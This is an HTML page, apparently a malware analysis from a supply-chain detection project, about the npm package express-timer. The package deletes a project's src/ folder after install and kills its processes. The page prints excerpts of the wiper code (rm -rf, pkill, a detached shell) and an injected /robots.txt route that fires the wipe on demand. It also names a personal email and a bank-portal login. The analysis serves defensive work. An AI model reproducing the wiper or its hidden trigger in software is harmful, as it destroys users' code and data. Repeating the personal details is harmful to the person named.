@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>express-timer: an npm &#39;security helper&#39; that self-destructs your src/ - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="express-timer: an npm &#39;security helper&#39; that self-destructs your src/ - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>express-timer: an npm &#39;security helper&#39; that self-destructs your src/</h1>
+    <span class="post-meta">2026-06-09 &middot; npm &middot; express-timer</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/express-timer-self-destruct.jpg" alt="Meme: a trench-coated cartoon detective holding a note captioned 'This message will SELF DESTRUCT..' — the package's whole personality, except the message is your src/ folder.">
+<p>express-timer bills itself as lightweight security helpers for Express, but ships no helpers and exfiltrates nothing: it is a dead-man's switch that, a minute after install, deletes the project's <code>src/</code> and kills the Node and PM2 processes running it.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>express-timer</code></td>
+</tr>
+<tr>
+<td>Versions</td>
+<td><code>1.0.2</code>, <code>1.0.3</code>, <code>1.0.5</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td><code>Lightweight security helpers for Express</code></td>
+</tr>
+<tr>
+<td>Author</td>
+<td><code>Your Name</code></td>
+</tr>
+<tr>
+<td>License</td>
+<td><code>MIT</code></td>
+</tr>
+<tr>
+<td>Main</td>
+<td><code>index.js</code></td>
+</tr>
+<tr>
+<td>Scripts</td>
+<td><code>postinstall: node scripts/inject.js</code></td>
+</tr>
+<tr>
+<td>Peer dependencies</td>
+<td><code>express &gt;=4.0.0</code></td>
+</tr>
+<tr>
+<td>Dependencies</td>
+<td><code>express-self-destruct1@^1.0.0</code>, <code>express-timer@^1.0.0</code> (itself)</td>
+</tr>
+<tr>
+<td>Repository</td>
+<td>none</td>
+</tr>
+</tbody>
+</table>
+<h2 id="one-wiper%2C-two-triggers" tabindex="-1"><a class="header-anchor" href="#one-wiper%2C-two-triggers"><span>One wiper, two triggers</span></a></h2>
+<p>Two triggers live in two files: the timer below arms on require, and a <code>postinstall</code> script grafts a <code>/robots.txt</code> handler onto your entry point that re-runs the wipe on demand over HTTP (the elaborate scheduler branch dies on load because the package never declares the library it needs). The deletion hardens release to release — <code>1.0.2</code> kills then deletes, <code>1.0.3</code> deletes first so a hurried Ctrl-C cannot save you, and <code>1.0.5</code> detaches a background shell that outlives the clean-exiting parent.</p>
+<pre class="lang-js"><code><span class="tok-com">// index.js — arms on require, no trigger, no condition</span>
+<span class="tok-fn">scheduleDestructionAfter</span>()   <span class="tok-com">// no arg → setTimeout(selfDestruct, 60_000)</span>
+
+<span class="tok-com">// selfDestruct() — buildDir = join(process.cwd(), "src")</span>
+<span class="tok-kw">await</span> <span class="tok-fn">execPromise</span>(<span class="tok-str">`rm -rf "${buildDir}"`</span>)              <span class="tok-com">// wipe the source tree</span>
+<span class="tok-kw">await</span> <span class="tok-fn">execPromise</span>(<span class="tok-str">`pkill -f "node.*${process.cwd()}"`</span>)   <span class="tok-com">// take the running app down with it</span>
+</code></pre>
+<pre class="lang-js"><code><span class="tok-com">// index.js 1.0.5 — the wipe detaches and outlives the parent</span>
+<span class="tok-kw">const</span> child = <span class="tok-fn">spawn</span>(<span class="tok-str">'/bin/sh'</span>, [<span class="tok-str">'-c'</span>, <span class="tok-str">`sleep 2 &amp;&amp; rm -rf "${buildDir}"`</span>], { detached: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
+child.<span class="tok-fn">unref</span>(); process.<span class="tok-fn">exit</span>(<span class="tok-num">0</span>);   <span class="tok-com">// parent leaves clean; the orphaned shell still nukes src/</span>
+</code></pre>
+<pre class="lang-js"><code><span class="tok-com">// scripts/inject.js appends this to YOUR entrypoint; ${appVar} = your express() var</span>
+<span class="tok-id">app</span>.<span class="tok-fn">get</span>(<span class="tok-str">'/robots.txt'</span>, (req, res) =&gt; {
+  <span class="tok-kw">if</span> (req.query.verify === <span class="tok-str">'destroy'</span>) { <span class="tok-fn">_boom</span>(); res.<span class="tok-fn">status</span>(<span class="tok-num">200</span>).<span class="tok-fn">send</span>(<span class="tok-str">'OK'</span>); }
+  <span class="tok-kw">else</span> res.<span class="tok-fn">send</span>(<span class="tok-str">'User-agent: *\nDisallow: /'</span>);   <span class="tok-com">// looks like an ordinary robots handler</span>
+});
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/impact/wipe/disk/mass-delete</code></td>
+<td>deletes <code>&lt;cwd&gt;/src</code> — armed at import and again via the grafted <code>/robots.txt</code> route</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/impact/services/stop</code></td>
+<td>kills the project's Node + PM2 processes (<code>pkill</code>, <code>pm2 delete all</code>, <code>taskkill</code>)</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/trigger/activation</code></td>
+<td><code>?verify=destroy</code> fires the wipe on demand over HTTP</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/install-hook/scripts/lifecycle</code></td>
+<td><code>postinstall</code> runs the injector, which appends the self-destruct snippet to the host entrypoint</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/manifest/npm</code></td>
+<td>install hooks with no repository; mature version lacking provenance</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/package/npm</code></td>
+<td>missing standard metadata; placeholder author, no repo</td>
+</tr>
+</tbody>
+</table>
+<h2 id="the-orphan-file-%E2%80%94-ibbl_statment.php" tabindex="-1"><a class="header-anchor" href="#the-orphan-file-%E2%80%94-ibbl_statment.php"><span>The orphan file — ibbl_statment.php</span></a></h2>
+<p>Every archive also carries a file no code loads: a 570-line scraper for the Islami Bank Bangladesh agent portal that signs in with the author's own credentials in plain text at the top, so a real banking password (masked below) traveled out with the malware when he published a whole working directory to npm. The author who built a tool to destroy other people's code shipped his own bank password along with it.</p>
+<pre class="lang-js"><code><span class="tok-com">// ibbl_statment.php — orphan at the package root, imported by nothing</span>
+<span class="tok-fn">define</span>(<span class="tok-str">"BASE"</span>, <span class="tok-str">"https://agent.islamibankbd.com"</span>);
+<span class="tok-fn">define</span>(<span class="tok-str">"USER"</span>, <span class="tok-str">"mohiuddin767272@gmail.com"</span>);
+<span class="tok-fn">define</span>(<span class="tok-str">"PASS"</span>, <span class="tok-str">"So•••••••"</span>);   <span class="tok-com">// author's real bank login, masked here</span>
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/credential-access/financial/account</code></td>
+<td>hardcoded-login scraper for <code>agent.islamibankbd.com</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>micro-behaviors/communications/email/send/mail-func</code></td>
+<td><code>mohiuddin767272@gmail.com</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>micro-behaviors/communications/http/curl</code></td>
+<td><code>curl_exec</code> against the bank portal</td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1.0.2</code> tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/8241a0b7e11687ee6713a0094cf9f834adeaf9c66ffa1b88dba42bd171a110ec"><code>8241a0b7e11687ee6713a0094cf9f834adeaf9c66ffa1b88dba42bd171a110ec</code></a></td>
+</tr>
+<tr>
+<td><code>1.0.3</code> tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/a6bf1478bfa5ffa0791da533555ee35421e644d4d8d11d3c7f1afe2372e56289"><code>a6bf1478bfa5ffa0791da533555ee35421e644d4d8d11d3c7f1afe2372e56289</code></a></td>
+</tr>
+<tr>
+<td><code>1.0.2</code> index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/f0f5387c6e4f8b07ef1928d4257dfa9383163bb8988d05ef36da0ffbdcea8ac4"><code>f0f5387c6e4f8b07ef1928d4257dfa9383163bb8988d05ef36da0ffbdcea8ac4</code></a></td>
+</tr>
+<tr>
+<td><code>1.0.3</code> index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/9f8f7da91c17db216f18fcceff1006e57c18a67cf575064863454145ee6bdb76"><code>9f8f7da91c17db216f18fcceff1006e57c18a67cf575064863454145ee6bdb76</code></a></td>
+</tr>
+<tr>
+<td><code>1.0.5</code> tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/7550e1db05f30636ba0c61b09b5647a65d801d6fc9efa181f368a18ed4b41147"><code>7550e1db05f30636ba0c61b09b5647a65d801d6fc9efa181f368a18ed4b41147</code></a></td>
+</tr>
+<tr>
+<td><code>1.0.5</code> index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/0ed7fc907c2df0f4f7900b20f5e5bd7c6b1c08e9c0be871c3448c7c2220c878c"><code>0ed7fc907c2df0f4f7900b20f5e5bd7c6b1c08e9c0be871c3448c7c2220c878c</code></a></td>
+</tr>
+<tr>
+<td><code>scripts/inject.js</code> SHA-256 (all three versions)</td>
+<td><a href="https://lab.atomdrift.org/file/b1970350a7bc69bef9cf4061fd46571d344e2c11dde87f0e69ea28e983340eae"><code>b1970350a7bc69bef9cf4061fd46571d344e2c11dde87f0e69ea28e983340eae</code></a></td>
+</tr>
+<tr>
+<td><code>ibbl_statment.php</code> SHA-256 (all three versions)</td>
+<td><a href="https://lab.atomdrift.org/file/1a29874be6538470d99c55ea6de2cc95e44d1c8187fde1eba75dcd01cde728f0"><code>1a29874be6538470d99c55ea6de2cc95e44d1c8187fde1eba75dcd01cde728f0</code></a></td>
+</tr>
+<tr>
+<td>Injected host-file marker</td>
+<td><code>SELF-DESTRUCT-ARMED</code></td>
+</tr>
+<tr>
+<td>Hardcoded email</td>
+<td><code>mohiuddin767272@gmail.com</code></td>
+</tr>
+<tr>
+<td></content></td>
+<td></td>
+</tr>
+<tr>
+<td></invoke></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
